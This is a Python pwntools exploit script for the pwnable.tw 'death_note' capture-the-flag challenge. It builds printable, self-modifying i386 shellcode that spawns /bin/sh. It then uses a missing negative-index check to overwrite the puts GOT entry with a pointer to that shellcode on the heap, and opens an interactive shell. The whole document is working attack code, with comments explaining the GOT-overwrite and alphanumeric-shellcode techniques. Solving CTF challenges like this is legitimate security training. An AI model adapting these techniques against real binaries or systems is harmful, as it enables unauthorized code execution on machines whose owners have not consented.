import argparse

from pwn import *


def is_printable(data: bytes):
    # the impl of is_printable in the binary is buggy... it should check for >= 0x7f
    # however this doesn't help us a lot because the shellcode we generate doesn't use byte values higher than 0x7e.
    return all(chr(b) in string.printable for b in data)


def remove_comments(assembly_code: str) -> str:
    """
    Remove comments from assembly code. Comments start with ';' and continue to the end of the line.

    Args:
        assembly_code (str): The input assembly code as a string.

    Returns:
        str: The assembly code without comments.
    """
    # Regex pattern to match comments starting with ';' and removing them along with the rest of the line
    return re.sub(r";.*", "", assembly_code)


def generate_printable_shellcode():
    code = remove_comments(
        """
        ; some knowledge about context in execution:
        ; ECX = 0
        ; EDX = return of strdup() [last allocated note]

        push 0x68 ; h
        push 0x732f2f2f ; ///s
        push 0x6e69622f ; /bin
        push esp
        pop ebx ; ebx=esp points to /bin///sh

        ; eax = edx, points to the shellcode itself
        push edx 
        pop eax 

        ; patch last two bytes of the shellcode to make it `int 80h`
        push 83
        pop edx ; edx = 83
        sub byte ptr [eax+39],dl ; code[39] -= 83 = 32 - 83 = 0xcd (wraps)
        sub byte ptr [eax+40],dl ; code[40] -= 83 = 67 - 83 = 0xf0 (wraps)
        push 0x70
        pop edx ; edx = 0x70
        xor byte ptr [eax+40],dl ; code[40] ^= 0x70 = 0xf0 ^ 0x70 = 0x80
    
        push ecx ; push 0
        pop edx ; EDX = 0 (envp)

        ; set eax to 11 (SYS_execve)
        push ecx ; push 0
        pop eax ; EAX = 0
        xor al, 'a' ; eax = 97
        xor al, 'j' ; eax = 97 ^ 106 = 11
    """
    )

    return b"".join(
        [
            asm(code),
            # these two bytes will be patched to int 80h (0xcd 0x80) by the shellcode itself :D
            b"\x20\x43",
        ]
    )


class App:
    def __init__(self, p: tube):
        self._p = p

    def add_note(self, index: int, note: bytes):
        self._p.sendlineafter(b"Your choice :", b"1")  # Create name
        self._p.sendlineafter(b"Index :", str(index).encode())

        # we use sendline() in order for the app to put a null terminator right after the data.
        # otherwise, there can be garbage on the stack that will make is_printable check to return false.
        self._p.sendlineafter(b"Name :", note)

    def remove_note(self, index: int):
        self._p.sendlineafter(b"Your choice :", b"3")  # Delete note
        self._p.sendlineafter(b"Index :", str(index).encode())


def conn(local: bool):
    if local:
        return process("./death_note")

    return remote("chall.pwnable.tw", 10201)


def exploit(local: bool, debug: bool):
    p = conn(local)
    app = App(p)

    if debug:
        # force heap initialization
        app.add_note(0, b"AAAA")
        app.remove_note(0)
        gdb.attach(p, "b *0x080487d8")

        # This is needed because WSL maps the heap without exec bit... although it should be executed
        # because the binary itself was compiled with -zexecstack.
        #
        # Patch the heap to be executable:
        # call (int) mprotect((void*)0x8daa000, 0x2200, 0x7)

    shellcode = generate_printable_shellcode()
    info(f"Crafted shellcode [{len(shellcode)} bytes]:")
    print(hexdump(shellcode))

    # read() is called with size=80
    assert len(shellcode) < 80
    assert is_printable(shellcode)

    # overwrite puts@GOT to point to our shellcode (on the heap).
    #
    # vulnerability details:
    # the `add_note` function doesn't check for negative index values,
    # therefore we can supply a negative index and overwrite a GOT entry
    # with the returned value from strdup(). That means that the next time
    # the relevant GOT entry will be executed, it will actually execute code
    # from the heap (and lucky for us, this binary has RXW segments).

    index = -16  # (elf.got["puts"] - elf.sym["note"]) // 4
    app.add_note(index, shellcode)
    p.interactive()


def main():
    context.arch = "i386"
    parser = argparse.ArgumentParser()
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--local", action="store_true")
    args = parser.parse_args()

    exploit(args.local, args.debug)


if __name__ == "__main__":
    main()
